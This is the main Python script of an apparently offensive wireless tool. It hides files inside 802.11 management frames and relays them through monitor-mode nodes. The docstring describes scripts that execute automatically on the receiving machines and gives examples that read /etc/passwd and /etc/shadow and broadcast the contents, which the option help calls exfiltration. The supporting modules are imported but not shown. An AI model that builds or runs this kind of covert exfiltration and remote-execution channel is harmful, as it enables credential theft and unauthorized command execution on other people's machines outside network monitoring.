'''
This script reads a file in, encodes it in 802.11 packets, and then sends it out
in management frames for interception (not over the network, but just in the air).
If a client is listening, it will stich the file back together as well as retransmit
it out. Files have a TTL, an initial send count, and timeout to try to improve accuracy.

As is, devices need to be in monitor mode to receive. Files in the scripts folder are
processed at launch, files in the output are automatically transmitted; use scripts to 
produce output is the intended method of use. IF you transmit a script (identified by keyword
in the definitions class) it will run on the receiving machines (output sent out) and then be stored in the
script folder. If you want to run the script as a one-time execution add the word delete
to the second line of the file

e.g. the file below will return the passwd/shadow contents to receiving machines and delete the script
#!/bin/sh
#execute
cat /etc/passwd
cat /etc/shadow

e.g. the file below will return the passwd/shadow contents to receiving machines anytime the node is launched
#!/bin/sh
#store
cat /etc/passwd
cat /etc/shadow

I didn't bother with error checking so much, but there's a -h option.

@author JoinEngine'
'''

#TODO	
#fix memory
#verbose flag works, just add a verbose function and pepper some verbose statemnts 
#limit file size to like 5 GB or whatever can be read into memory
#integrity checking

import management 
import transmitter
import receiver
import definitions
import timeout
from definitions import vprint

import os
import logging

from optparse import OptionParser
from threading import Thread
from time import sleep
from multiprocessing import Process, Manager, Pool

'''
'This continually parses the output folder and transmits any files found.
'this behavior can be turned off through a command-line flag
'''
def processOutputFolder():
	try:
		cwd=os.getcwd()
		outputPath=os.path.join(cwd, definitions.OUTPUT_PATH)
		archivePath=os.path.join(cwd, definitions.ARCHIVE_PATH)
		toTransmit = os.listdir(outputPath)

		for i in xrange (0, len(toTransmit)):
			fullPath=os.path.join(outputPath, toTransmit[i])
			backupPath=os.path.join(archivePath, toTransmit[i])

			os.rename(fullPath, fullPath)
			transmitter.transmit(filename=fullPath)
		
			if definitions.archiveOutput:
				os.rename(fullPath, backupPath)
			else: 
				os.remove(fullPath)

		sleep(definitions.OUTPUT_PROCESS_INTERVAL)
		t=Thread(target=processOutputFolder())
		t.daemon=True
		t.start()
	except:
		os._exit(0)
	
'''
'This configures the parser for cmd line options
'''
def configureParser():
	parser=OptionParser()
	parser.add_option("-f", "--file", action="store", type="string", dest="singleFile", metavar="FILE", 
		help="a file that should be transmitted (single transmissions)")
	parser.add_option("-i", action="store", type="string", dest="listener", metavar="IFACE",
		help="the interface that should be used to transmit/receive.")
	parser.add_option("-t", "--ttl", action="store", type="int", dest="ttlPeriod", metavar="TTL",
		help="This sets the number of rebroadcasts for a packet. TTL must be < 0")
	parser.add_option("-c", action="store", type="int", dest="sendCount", metavar="SEND COUNT", 
		help="How many times to broadcast an exfiltrated file.")
	parser.add_option("-d", action="store_false", dest="writeToDisk", metavar="DO NOT WRITE",
		help="Don't write files to disk, retransmit only.")
	parser.add_option("-n", action="store_true", dest="noProcess", metavar="PROCESS OUTPUT", 
		help="if the output folder should be ignored (if multiple scripts running)")
	parser.add_option("-a", action="store_true", dest="archive", metavar="ENABLE ARCHIVE", 
		help="write transmited output to archive folder instead of deleting it")
	parser.add_option("-v", action="store_true", dest="verbose", metavar="VERBOSE", 
		help="displays additional information while running")
	parser.add_option("-o", action="store", type="int", dest="timeoutPeriod", metavar="TIMEOUT DELAY",
		help="Duration to wait for timeout, minimum of 10 (default) recommended")
	parser.add_option("-m", action="store", dest="memoryS", type="int", metavar="PERSIST FILE COUNT", 
		help="Number of files to record in memory, beware memory limitations.")
	return parser

'''
'This takes in the set options and sets the corresponding variables
'@param optionsIn an options feed to interpret
'''
def setCustomVariables(optionsIn):
	if (optionsIn.singleFile):		
		definitions.singleFile=optionsIn.singleFile
	if (optionsIn.listener):
		definitions.ifaceName=optionsIn.listener
	if (optionsIn.ttlPeriod is not None):
		definitions.packetTTL=optionsIn.ttlPeriod
	if (optionsIn.sendCount):
		definitions.transmitCount=optionsIn.sendCount
	if (optionsIn.noProcess):
		definitions.noProcess=optionsIn.noProcess
	if (optionsIn.timeoutPeriod):
		definitions.TIMEOUT_CONSTANT=optionsIn.timeoutPeriod
	if (optionsIn.archive):
		definitions.archiveOutput=optionsIn.archive
	if (optionsIn.verbose):
		definitions.verbose=optionsIn.verbose
	if (optionsIn.writeToDisk is not None):
		definitions.writeToDisk=optionsIn.writeToDisk
	if (optionsIn.memoryS):
		definitions.memorySize=int(optionsIn.memoryS)

if __name__ == '__main__':
	parser=configureParser()
	(options, args) = parser.parse_args()
	setCustomVariables(optionsIn=options)

	if (definitions.memorySize>0):
		definitions.memory=True
	else:
		definitions.memory=False

	vprint('verbose mode is on')
	if (definitions.singleFile):
		print ('transmitting initiated in single file mode...')
		p=Process(target=transmitter.transmit, kwargs={'filename':definitions.singleFile})
		p.start()
	
	management.startScripts() 

	if not definitions.noProcess:
		p=Process(target=processOutputFolder)
		p.start()

	p=Process(target=timeout.timeoutWrapper) #this is unclean, but sniff is a separate thread, and this method ends once it's called which terminates separate processes. This keeps the process alive vs starting a new thread and immediately killing it in the interval nothing is active
	p.start()

	receiver.sniffForData()
	